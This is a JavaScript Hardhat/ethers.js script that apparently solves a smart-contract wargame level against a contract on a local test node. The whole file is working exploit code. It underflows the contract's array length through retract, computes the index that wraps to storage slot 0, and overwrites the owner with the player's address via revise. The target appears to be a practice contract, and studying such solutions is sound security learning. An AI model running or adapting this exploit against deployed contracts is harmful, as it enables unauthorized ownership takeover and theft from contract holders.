const { ethers } = require("hardhat");
const etherss = require("ethers");

const CONTRACT_ADDRESS = "0xF1823bc4243b40423b8C8c3F6174e687a4C690b8";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";
const contractInterface = [
  {
    constant: false,
    inputs: [
      {
        name: "i",
        type: "uint256",
      },
      {
        name: "_content",
        type: "bytes32",
      },
    ],
    name: "revise",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x0339f300",
  },
  {
    constant: false,
    inputs: [],
    name: "makeContact",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x328b52cb",
  },
  {
    constant: true,
    inputs: [],
    name: "contact",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
    signature: "0x33a8c45a",
  },
  {
    constant: false,
    inputs: [],
    name: "retract",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x47f57b32",
  },
  {
    constant: false,
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
    signature: "0x715018a6",
  },
  {
    constant: true,
    inputs: [],
    name: "owner",
    outputs: [
      {
        name: "",
        type: "address",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
    signature: "0x8da5cb5b",
  },
  {
    constant: true,
    inputs: [],
    name: "isOwner",
    outputs: [
      {
        name: "",
        type: "bool",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
    signature: "0x8f32d59b",
  },
  {
    constant: true,
    inputs: [
      {
        name: "",
        type: "uint256",
      },
    ],
    name: "codex",
    outputs: [
      {
        name: "",
        type: "bytes32",
      },
    ],
    payable: false,
    stateMutability: "view",
    type: "function",
    signature: "0x94bd7569",
  },
  {
    constant: false,
    inputs: [
      {
        name: "_content",
        type: "bytes32",
      },
    ],
    name: "record",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xb5c645bd",
  },
  {
    constant: false,
    inputs: [
      {
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
    signature: "0xf2fde38b",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
    signature:
      "0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0",
  },
];
const SLOT_INDEX = 0;
async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Create a JsonRpcProvider instance that connects to the local network
  const provider = new ethers.providers.JsonRpcProvider(
    "http://localhost:8545"
  );

  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    signer
  );

  const addressBytes32 = ethers.utils.hexZeroPad(PLAYER_ADDRESS, 32);

  await contract.makeContact();

  await contract.retract();

  const one = etherss.BigNumber.from(1);
  const two = etherss.BigNumber.from(2);
  const index = two
    .pow(256)
    .sub(one)
    .sub(
      etherss.BigNumber.from(
        etherss.utils.keccak256(
          etherss.utils.defaultAbiCoder.encode(["uint"], [1])
        )
      )
    )
    .add(one);

  await contract.revise(index, addressBytes32);
  // Read the value of the "locked" variable (slot 0)
  const value = await provider.getStorageAt(CONTRACT_ADDRESS, SLOT_INDEX);
  console.log(`Value of owner variable: ${value}`);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
